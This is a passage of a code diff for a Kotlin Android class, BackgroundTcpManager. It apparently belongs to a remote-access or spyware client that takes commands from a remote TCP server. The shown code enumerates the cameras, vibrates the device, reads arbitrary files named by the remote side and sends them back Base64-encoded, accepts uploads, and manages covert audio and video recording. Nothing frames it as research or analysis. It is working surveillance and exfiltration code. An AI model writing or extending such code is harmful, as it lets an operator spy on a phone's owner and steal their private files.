+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                // Modern Camera2 API
+                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager
+                val cameraIds = cameraManager.cameraIdList
+
+                for (cameraId in cameraIds) {
+                    val characteristics = cameraManager.getCameraCharacteristics(cameraId)
+                    val facing = characteristics.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)
+
+                    val facingStr = when (facing) {
+                        android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT -> "Front"
+                        android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK -> "Back"
+                        android.hardware.camera2.CameraCharacteristics.LENS_FACING_EXTERNAL -> "External"
+                        else -> "Unknown"
+                    }
+
+                    result.append("Camera $cameraId: $facingStr\n")
+                }
+            } else {
+                // Legacy Camera API
+                @Suppress("DEPRECATION")
+                val numberOfCameras = android.hardware.Camera.getNumberOfCameras()
+
+                for (i in 0 until numberOfCameras) {
+                    @Suppress("DEPRECATION")
+                    val cameraInfo = android.hardware.Camera.CameraInfo()
+                    @Suppress("DEPRECATION")
+                    android.hardware.Camera.getCameraInfo(i, cameraInfo)
+
+                    val facingStr = when (cameraInfo.facing) {
+                        android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT -> "Front"
+                        android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK -> "Back"
+                        else -> "Unknown"
+                    }
+
+                    result.append("Camera $i: $facingStr\n")
+                }
+            }
+
+            if (result.toString().contains("Camera")) {
+                result.toString()
+            } else {
+                "No cameras found on device"
+            }
+
+        } catch (e: Exception) {
+            Log.e(TAG, "Error getting camera list: ${e.message}")
+            "Error getting camera list: ${e.message}"
+        }
+    }
     // === VIBRATION IMPLEMENTATION ===
 
     private fun vibrateDevice(times: Int): String {
@@ -956,77 +936,57 @@ class BackgroundTcpManager(private val context: Context) {
     }
 
 // SIMPLIFIED: Single-message download in BackgroundTcpManager.kt
+private suspend fun downloadFile(filePath: String, socket: Socket) {
+    try {
+        Log.d(TAG, "Download request for: $filePath")
 
-    private suspend fun downloadFile(filePath: String, socket: Socket) {
-        try {
-            Log.d(TAG, "Download request for: $filePath")
-
-            // Handle relative vs absolute paths
-            val file = if (filePath.startsWith("/")) {
-                File(filePath)
-            } else {
-                File(currentDirectory, filePath)
-            }
-
-            Log.d(TAG, "Resolved file path: ${file.absolutePath}")
-
-            if (!file.exists()) {
-                sendResponse("ERROR: File not found: ${file.absolutePath}", socket)
-                return
-            }
-
-            if (!file.isFile) {
-                sendResponse("ERROR: Not a file: ${file.absolutePath}", socket)
-                return
-            }
-
-            if (file.length() > MAX_FILE_SIZE) {
-                sendResponse("ERROR: File too large (max ${MAX_FILE_SIZE / 1024 / 1024}MB): ${formatFileSize(file.length())}", socket)
-                return
-            }
-
-            Log.d(TAG, "Reading file: ${file.name}, size: ${file.length()}")
-            val fileData = file.readBytes()
-            val encodedData = Base64.encodeToString(fileData, Base64.DEFAULT)
-
-            // SIMPLIFIED: Send everything in one message with getFile prefix
-            val fileName = file.nameWithoutExtension
-            val fileExtension = file.extension.ifEmpty { "bin" }
-            val downloadResponse = "getFile\n$fileName|_|$fileExtension|_|$encodedData"
-
-            withContext(Dispatchers.IO) {
-                outputStream.write(downloadResponse.toByteArray(Charsets.UTF_8))
-                outputStream.write("END123\n".toByteArray(Charsets.UTF_8))
-                outputStream.flush()
-            }
-
-            Log.d(TAG, "Download sent successfully: ${file.name}")
-
-        } catch (e: Exception) {
-            Log.e(TAG, "Error downloading file: ${e.message}", e)
-            sendResponse("ERROR: Download failed: ${e.message}", socket)
+        // Handle relative vs absolute paths
+        val file = if (filePath.startsWith("/")) {
+            File(filePath)
+        } else {
+            File(currentDirectory, filePath)
         }
-    }
-    // FIXED: Special response method for downloads (no END123 marker)
-    private suspend fun sendDownloadResponse(message: String, socket: Socket) {
-        try {
-            if (!isSocketAlive(socket)) {
-                Log.d(TAG, "Socket not alive, cannot send download response")
-                return
-            }
 
-            withContext(Dispatchers.IO) {
-                // Don't add END123 for download responses - server handles them differently
-                val fullMessage = message + if (!message.endsWith("\n")) "\n" else ""
-                outputStream.write(fullMessage.toByteArray(Charsets.UTF_8))
-                outputStream.flush()
-            }
-            Log.d(TAG, "Download response sent: ${message.take(50)}...")
-        } catch (e: Exception) {
-            Log.e(TAG, "Error sending download response: ${e.message}")
-            Log.e(TAG, "Error sending download response: ${e.message}")
+        Log.d(TAG, "Resolved file path: ${file.absolutePath}")
+
+        if (!file.exists()) {
+            sendResponse("ERROR: File not found: ${file.absolutePath}", socket)
+            return
         }
+
+        if (!file.isFile) {
+            sendResponse("ERROR: Not a file: ${file.absolutePath}", socket)
+            return
+        }
+
+        if (file.length() > MAX_FILE_SIZE) {
+            sendResponse("ERROR: File too large (max ${MAX_FILE_SIZE / 1024 / 1024}MB): ${formatFileSize(file.length())}", socket)
+            return
+        }
+
+        Log.d(TAG, "Reading file: ${file.name}, size: ${file.length()}")
+        val fileData = file.readBytes()
+        val encodedData = Base64.encodeToString(fileData, Base64.DEFAULT)
+
+        // SIMPLIFIED: Send everything in one message with getFile prefix
+        val fileName = file.nameWithoutExtension
+        val fileExtension = file.extension.ifEmpty { "bin" }
+        val downloadResponse = "getFile\n$fileName|_|$fileExtension|_|$encodedData"
+
+        withContext(Dispatchers.IO) {
+            outputStream.write(downloadResponse.toByteArray(Charsets.UTF_8))
+            outputStream.write("END123\n".toByteArray(Charsets.UTF_8))
+            outputStream.flush()
+        }
+
+        Log.d(TAG, "Download sent successfully: ${file.name}")
+
+    } catch (e: Exception) {
+        Log.e(TAG, "Error downloading file: ${e.message}", e)
+        sendResponse("ERROR: Download failed: ${e.message}", socket)
     }
+}
+
     private fun handleUpload(command: String, socket: Socket): String {
         return try {
             Log.d(TAG, "Processing upload: $command")
@@ -2028,6 +1988,9 @@ class BackgroundTcpManager(private val context: Context) {
         }
     }
 
+// COMPLETE FIXED sendResponse method - Replace in BackgroundTcpManager.kt
+// CORRECTED sendResponse method - Replace in BackgroundTcpManager.kt
+
     private suspend fun sendResponse(message: String, socket: Socket) {
         try {
             if (!isSocketAlive(socket)) {
@@ -2035,20 +1998,36 @@ class BackgroundTcpManager(private val context: Context) {
                 return
             }
 
+            val responseData = buildString {
+                append(message)
+                if (!message.endsWith("\n")) append("\n")
+                append("END123\n")
+            }.toByteArray(Charsets.UTF_8)
+
             withContext(Dispatchers.IO) {
-                val fullMessage = message + if (!message.endsWith("\n")) "\n" else ""
-                outputStream.write(fullMessage.toByteArray(Charsets.UTF_8))
-                outputStream.write("END123\n".toByteArray(Charsets.UTF_8))
-                outputStream.flush()
+                synchronized(outputStream) {  // FIXED: Only synchronize the actual write operation
+                    try {
+                        outputStream.write(responseData)
+                        outputStream.flush()
+
+                        Log.d(TAG, "Response sent: ${message.take(50)}...")
+
+                    } catch (e: IOException) {
+                        Log.e(TAG, "IO error sending response: ${e.message}")
+                        throw e
+                    }
+                }
+
+                // FIXED: Delay OUTSIDE the synchronized block
+                delay(50)
             }
-            Log.d(TAG, "Response sent: ${message.take(100)}...")
+
         } catch (e: Exception) {
             Log.e(TAG, "Error sending response: ${e.message}")
         }
     }
-
     private suspend fun scheduleReconnect() {
-        synchronized(this) {
+        synchronized(connectionLock) {
             if (isReconnecting) {
                 Log.d(TAG, "Reconnection already in progress")
                 return
@@ -2071,7 +2050,7 @@ class BackgroundTcpManager(private val context: Context) {
 
         delay(totalDelay)
 
-        synchronized(this) {
+        synchronized(connectionLock) {
             isReconnecting = false
         }
 
@@ -2080,16 +2059,45 @@ class BackgroundTcpManager(private val context: Context) {
 
     private fun cleanup() {
         try {
+            // Cancel jobs
             connectionJob?.cancel()
+
+            // Close socket
             currentSocket?.close()
             currentSocket = null
 
+            isVideoRecording = false
+            mediaRecorderVideo?.release()
+            mediaRecorderVideo = null
+            videoFile?.delete()
+            videoFile = null
+
             // Clean up audio recording
-            if (isRecording) {
-                mediaRecorder?.release()
-                mediaRecorder = null
-                isRecording = false
+            synchronized(recordingLock) {
+                if (isRecording) {
+                    try {
+                        mediaRecorder?.stop()
+                    } catch (e: Exception) {
+                        Log.w(TAG, "Error stopping media recorder during cleanup: ${e.message}")
+                    }
+                    mediaRecorder?.release()
+                    mediaRecorder = null
+                    isRecording = false
+                }
+
+                // Clean up audio file
+                audioFile?.let { file ->
+                    if (file.exists()) {
+                        try {
+                            file.delete()
+                        } catch (e: Exception) {
+                            Log.w(TAG, "Error deleting audio file during cleanup: ${e.message}")
+                        }
+                    }
+                }
+                audioFile = null
             }
+
         } catch (e: Exception) {
             Log.e(TAG, "Error during cleanup: ${e.message}")
         }
